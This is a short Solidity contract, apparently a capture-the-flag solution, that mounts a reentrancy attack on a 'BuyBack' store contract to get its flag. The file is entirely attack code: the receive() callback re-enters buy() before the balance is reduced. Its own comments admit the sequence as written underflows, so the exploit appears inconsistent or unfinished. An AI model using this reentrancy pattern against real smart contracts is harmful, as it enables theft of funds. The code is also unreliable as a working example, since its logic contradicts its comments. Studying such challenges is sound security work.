// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {BuyBack} from './BuyBack.sol';

contract AttackBuyBack {
    BuyBack public store;
    uint256 public attackCount;

    constructor(address payable _storeAddress){
        store = BuyBack(_storeAddress);
        attackCount = 0;
    }

    receive() external payable {
        // buy() adds items, makes external call, THEN decrements balance
        // So when we're here, balance hasn't been decremented yet!
        // We can call buy() again!
        if (attackCount == 0) {
            attackCount = 1;
            store.buy(1);  // Buy just 1 more to avoid underflow
        }
    }

    function attack() public returns (string memory) {
        store.initialise();  // balance: 100, items: 0
        attackCount = 0;
        store.buy(100);      // Triggers receive() which calls buy(1) 
                             // First buy(100): items=100, calls receive(), balance still 100
                             //   Re-enter: buy(1), items=101, balance=99  
                             // Back to first buy(): balance -= 100 → balance would be -1
                             // This underflows! We need to buy less initially
        return store.getFlag();
    }
}